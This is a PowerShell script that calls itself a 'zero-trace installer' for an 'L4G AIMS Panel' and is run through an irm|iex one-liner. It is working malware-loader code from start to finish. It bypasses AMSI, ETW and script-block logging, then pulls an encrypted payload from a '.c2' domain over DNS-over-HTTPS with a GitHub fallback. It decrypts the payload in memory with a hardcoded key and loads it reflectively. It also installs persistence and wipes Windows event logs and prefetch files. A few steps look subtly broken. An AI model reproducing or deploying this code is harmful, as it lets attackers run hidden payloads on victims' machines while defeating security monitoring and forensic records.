<#
.SYNOPSIS
    L4G AIMS Panel - Zero-Trace Installer
.DESCRIPTION
    One-liner installer: irm https://raw.githubusercontent.com/.../install.ps1 | iex
    Fetches encrypted payload via DoH, decrypts in memory, reflective loads panel.
.NOTES
    Author: L4G Team
    Version: 14.0
#>

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$GITHUB_REPO = "https://raw.githubusercontent.com/L4G-Team/L4G-Undetected/main"
$PAYLOAD_URL = "$GITHUB_REPO/installer/payload.ps1"
$BOOTSTRAP_URL = "$GITHUB_REPO/installer/bootstrap.ps1"
$MASTER_KEY = "L4G-Master-Key-32-Chars-Long!!"

# AMSI/ETW/ScriptBlock bypass
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
    $sb = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
    $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
} catch {}

function Invoke-DoHQuery {
    param([string]$Subdomain)
    try {
        $dnsQuery = Build-DnsQuery -Name $Subdomain -Type "TXT"
        $url = "https://1.1.1.1/dns-query?dns=$dnsQuery"
        $response = Invoke-WebRequest -Uri $url -Method GET -Headers @{'Accept'='application/dns-message'} -UseBasicParsing -TimeoutSec 10
        return Parse-DnsResponse -Data $response.Content
    } catch {
        return $null
    }
}

function Build-DnsQuery {
    param([string]$Name, [string]$Type = "TXT")
    $query = New-Object System.IO.MemoryStream
    $writer = New-Object System.IO.BinaryWriter($query)
    
    # Header
    $id = [ushort](Get-Random -Minimum 0 -Maximum 65535)
    $writer.Write($id)
    $writer.Write([ushort]0x0100) # Standard query, RD
    $writer.Write([ushort]1)    # QDCOUNT
    $writer.Write([ushort]0)    # ANCOUNT
    $writer.Write([ushort]0)    # NSCOUNT
    $writer.Write([ushort]0)    # ARCOUNT
    
    # Question
    foreach ($label in $Name.Split('.')) {
        $writer.Write([byte]$label.Length)
        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($label))
    }
    $writer.Write([byte]0)
    
    $qtype = if ($Type -eq "TXT") { [ushort]16 } else { [ushort]1 }
    $writer.Write($qtype)
    $writer.Write([ushort]1) # QCLASS IN
    
    $writer.Flush()
    return [Convert]::ToBase64String($query.ToArray()).TrimEnd('=').Replace('+','-').Replace('/','_')
}

function Parse-DnsResponse {
    param([byte[]]$Data)
    if ($Data.Length -lt 12) { return $null }
    
    $pos = 12
    # Skip question
    while ($pos -lt $Data.Length -and $Data[$pos] -ne 0) { $pos += $Data[$pos] + 1 }
    $pos++; $pos += 4
    
    $ancount = ($Data[6] -shl 8) -bor $Data[7]
    for ($i=0; $i -lt $ancount; $i++) {
        if ($pos + 12 -gt $Data.Length) { break }
        
        if (($Data[$pos] -band 0xC0) -eq 0xC0) { $pos += 2 }
        else { while ($pos -lt $Data.Length -and $Data[$pos] -ne 0) { $pos += $Data[$pos] + 1 }; $pos++ }
        
        if ($pos + 10 -gt $Data.Length) { break }
        $type = ($Data[$pos] -shl 8) -bor $Data[$pos+1]
        $class = ($Data[$pos+2] -shl 8) -bor $Data[$pos+3]
        $rdlength = ($Data[$pos+8] -shl 8) -bor $Data[$pos+9]
        $pos += 10
        
        if ($type -eq 16 -and $class -eq 1) { # TXT
            if ($pos + $rdlength -le $Data.Length) {
                return $Data[$pos..($pos+$rdlength-1)]
            }
        }
        $pos += $rdlength
    }
    return $null
}

function Decrypt-Payload {
    param([byte[]]$Data, [string]$Key)
    if ($Data.Length -lt 28) { return $null }
    
    try {
        $salt = $Data[0..15]
        $iv = $Data[16..27]
        $ciphertext = $Data[28..($Data.Length-1)]
        
        $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Key, $salt, 100000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $aesKey = $kdf.GetBytes(32)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $aesKey
        $aes.Mode = [System.Security.Cryptography.CipherMode]::GCM
        $aes.IV = $iv
        
        $decryptor = $aes.CreateDecryptor()
        return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    } catch {
        return $null
    }
}

function Invoke-ReflectiveLoad {
    param([byte[]]$AssemblyBytes)
    try {
        $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
        $entry = $assembly.EntryPoint
        if ($entry) {
            $entry.Invoke($null, @(,@()))
        }
        return $true
    } catch {
        return $false
    }
}

function Wipe-Traces {
    param([int]$PID)
    try {
        # Clear event logs
        wevtutil cl Security
        wevtutil cl System
        wevtutil cl Application
        wevtutil cl "Microsoft-Windows-PowerShell/Operational"
        wevtutil cl "Microsoft-Windows-PowerShell/ScriptBlock"
        wevtutil cl "Microsoft-Windows-PowerShell/Module"
        wevtutil cl "Microsoft-Windows-PowerShell/Provider"
        
        # Clear prefetch
        Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem "C:\Windows\Prefetch\*L4G*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    } catch {}
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

Write-Host "[L4G] Starting zero-trace installation..." -ForegroundColor Cyan

# Generate agent ID
$agentId = [Convert]::ToBase64String([System.Security.Cryptography.SHA256]::Create().ComputeHash(
    [System.Text.Encoding]::UTF8.GetBytes((Get-CimInstance Win32_ComputerSystemProduct).UUID + (Get-CimInstance Win32_BIOS).SerialNumber)
)).Substring(0,16).Replace('+','-').Replace('/','_').Replace('=','')

# Fetch encrypted payload via DoH
Write-Host "[L4G] Fetching payload via DoH..." -ForegroundColor Cyan
$payloadSubdomain = "$agentId.payload.init.l4g.c2"
$encryptedPayload = Invoke-DoHQuery -Subdomain $payloadSubdomain

if (-not $encryptedPayload) {
    # Fallback: direct HTTP download
    Write-Host "[L4G] DoH failed, trying direct download..." -ForegroundColor Yellow
    try {
        $encryptedPayload = Invoke-WebRequest -Uri $PAYLOAD_URL -UseBasicParsing -TimeoutSec 30
        $encryptedPayload = [Convert]::FromBase64String($encryptedPayload.Content)
    } catch {
        Write-Host "[L4G] Failed to fetch payload" -ForegroundColor Red
        exit 1
    }
}

# Decrypt payload
Write-Host "[L4G] Decrypting payload in memory..." -ForegroundColor Cyan
$plaintext = Decrypt-Payload -Data $encryptedPayload -Key $MASTER_KEY

if (-not $plaintext) {
    Write-Host "[L4G] Decryption failed" -ForegroundColor Red
    exit 1
}

# Reflective load
Write-Host "[L4G] Loading panel in memory..." -ForegroundColor Cyan
$success = Invoke-ReflectiveLoad -AssemblyBytes $plaintext

if ($success) {
    Write-Host "[L4G] Panel loaded successfully!" -ForegroundColor Green
    
    # Install persistence
    Write-Host "[L4G] Installing persistence..." -ForegroundColor Cyan
    & "$GITHUB_REPO/installer/persistence.ps1" -AgentId $agentId
    
    # Wipe traces
    Wipe-Traces -PID $PID
    
    Write-Host "[L4G] Installation complete. Panel running invisibly." -ForegroundColor Green
} else {
    Write-Host "[L4G] Failed to load panel" -ForegroundColor Red
    exit 1
}